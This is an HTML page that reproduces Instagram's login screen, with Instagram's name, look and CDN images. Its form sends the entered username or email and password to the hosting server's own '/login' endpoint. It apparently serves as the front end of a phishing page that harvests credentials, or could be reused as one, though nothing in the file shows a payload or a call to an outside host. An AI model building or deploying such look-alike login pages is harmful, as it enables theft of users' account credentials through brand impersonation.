<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <!-- Using 'width=device-width' and 'initial-scale=1.0' for responsiveness -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* Correct CSS syntax in English */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            min-height: 100vh;
            margin: 0;
        }

        .container {
            display: flex;
            align-items: center;
        }

        .image-section {
            width: 380px;
            margin-right: 40px;
            overflow: hidden; /* Crop if it overflows */
        }

        .image-section img {
            width: 100%;
            height: auto;
            display: block;
        }

        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            width: 350px;
            margin-bottom: 20px;
        }

        .login-container h1 {
            font-family: 'Lobster', cursive;
            font-size: 2.5em;
            margin-bottom: 20px;
        }

        /* Form inputs */
        .login-container input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
        }

        /* Main button */
        .login-container button {
            width: 100%;
            background-color: #0095f6;
            color: #fff;
            border: none;
            padding: 10px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 5px;
            margin-bottom: 10px;
        }

        .login-container button:hover {
            background-color: #0074c7;
        }

        /* Signup link */
        .signup-link {
            margin-top: 15px;
            font-size: 0.9em;
        }

        .signup-link a {
            color: #0095f6;
            text-decoration: none;
            font-weight: bold;
        }

        .signup-link a:hover {
            text-decoration: underline;
        }

        /* App download section */
        .app-download {
            text-align: center;
            margin-top: 20px;
        }

        .app-download p {
            margin-bottom: 10px;
        }

        .app-download img {
            height: 40px;
            margin: 0 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Left image section -->
        <div class="image-section">
            <img 
                src="https://resizer.glanacion.com/resizer/v2/instagram-no-deja-ver-quienes-ingresan-al-perfil-GKHUEGJBJZCVJAY4PH63BJ7BKY?auth=d5ef1cfd295b84e35e632c9b595aa920f3a25449583b838a57e8e3fd4d7b032c&width=420&height=332&quality=70&smart=true" 
                alt="Instagram preview">
        </div>

        <!-- Login section -->
        <div>
            <div class="login-container">
                <h1>Instagram</h1>
                <form id="loginForm" action="/login" method="POST">
                    <input type="text" name="username" placeholder="Phone, username, or email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>

                <!-- Facebook login and forgot password links -->
                <div style="margin: 10px 0;">
                    <a href="#" style="color: #385185; text-decoration: none; font-weight: bold;">
                        Log in with Facebook
                    </a>
                </div>
                <div style="margin-bottom: 10px;">
                    <a href="#" style="font-size: 0.9em; color: #00376b; text-decoration: none;">
                        Forgot your password?
                    </a>
                </div>

                <div class="signup-link">
                    Don't have an account? <a href="#">Sign up</a>
                </div>
            </div>

            <!-- App download section -->
            <div class="app-download">
                <p>Download the app.</p>
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
                    <img src="https://static.cdninstagram.com/rsrc.php/v4/yd/r/xOhODS7viZl.png" alt="Google Play">
                </a>
                <a href="#">
                    <img src="https://static.cdninstagram.com/rsrc.php/v4/y9/r/LjIQEL8csb0.png" alt="Microsoft Store">
                </a>
            </div>
        </div>
    </div>
</body>
</html>
